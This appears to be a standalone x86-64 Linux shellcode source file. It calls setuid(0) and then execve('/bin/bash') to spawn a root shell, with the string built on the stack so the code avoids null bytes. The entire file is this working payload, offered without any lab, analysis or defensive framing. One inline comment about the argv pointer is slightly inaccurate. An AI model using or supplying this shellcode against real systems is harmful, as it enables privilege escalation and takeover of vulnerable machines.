global _start

_start:

xor rdi, rdi
; setuid(0)
xor eax, eax
mov al, 0x69
syscall         ; setuid

xor rax, rax
mov al, 0x68
push rax
mov rax, 0x7361622f6e69622f
push rax
mov rdi, rsp    ; str.bin_bash; "/bin/bash"

xor rax, rax
push rax
mov rax, rsp
push rax        ; 此时rsp就是 "/bin/bash"地址的指针
mov rsi, rsp    ; obj.buff; {"/bin/bash"}

;xor rsi, rsi
xor edx, edx      ; edx

; execve("/bin/bash", {"/bin/bash"}, NULL) 
xor eax, eax
mov al, 0x3b
syscall         ; execve